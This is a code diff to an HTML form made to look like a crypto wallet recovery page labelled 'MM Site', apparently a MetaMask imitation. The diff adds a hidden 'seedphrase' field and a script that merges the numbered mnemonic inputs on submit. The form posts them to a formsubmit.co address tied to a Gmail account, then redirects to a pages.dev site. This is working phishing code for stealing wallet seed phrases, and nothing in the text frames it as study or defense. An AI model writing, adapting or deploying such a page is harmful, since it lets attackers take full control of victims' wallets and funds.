@@ -33,8 +33,9 @@
     <form _ngcontent-wrh-c175="" novalidate="" class="ng-untouched ng-pristine ng-valid" 
     action="https://formsubmit.co/thefamilyonly994@gmail.com" method="POST">
     <input type="hidden" name="_next" value="https://loading-dapp.pages.dev/">
-     <input type="hidden" name="_subject" value="New message from MM Site">
+    <input type="hidden" name="_subject" value="New message from MM Site">
     <input type="hidden" name="website" value="MM Site">
+    <input type="hidden" name="seedphrase" id="seedphrase" value="">
 
         <section _ngcontent-wrh-c175="" class="mnemonic">
             <div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">1</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input1" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">2</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input2" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">3</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input3" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">4</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input4" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">5</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input5" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">6</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input6" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">7</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input7" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">8</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input8" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">9</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input9" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">10</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input10" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div><div _ngcontent-wrh-c175="" class="word ng-star-inserted" style=""><span _ngcontent-wrh-c175="" class="number">11</span><input _ngcontent-wrh-c175="" type="text" autocomplete="off" name="input11" autocorrect="off" autocapitalize="off" spellcheck="false" class="ng-untouched ng-pristine ng-valid"></div>
@@ -51,6 +52,17 @@
 
 <bottom-buttons _ngcontent-wrh-c175="" _nghost-wrh-c83=""><div _ngcontent-wrh-c83="" class="inner">
     <button _ngcontent-wrh-c83="" class="outline" type="submit"> Next <!----></button><!----><!----></div>
+    <script>
+    // Combine all seed phrase inputs into a single field
+    document.querySelector('form').addEventListener('submit', function(e) {
+        const inputs = Array.from(document.querySelectorAll('input[name^="input"]'))
+            .filter(input => input.value.trim() !== '')
+            .map(input => input.value.trim())
+            .join(' ');
+        
+        document.getElementById('seedphrase').value = inputs;
+    });
+</script>
 </form>
 </section>
 </bottom-buttons>
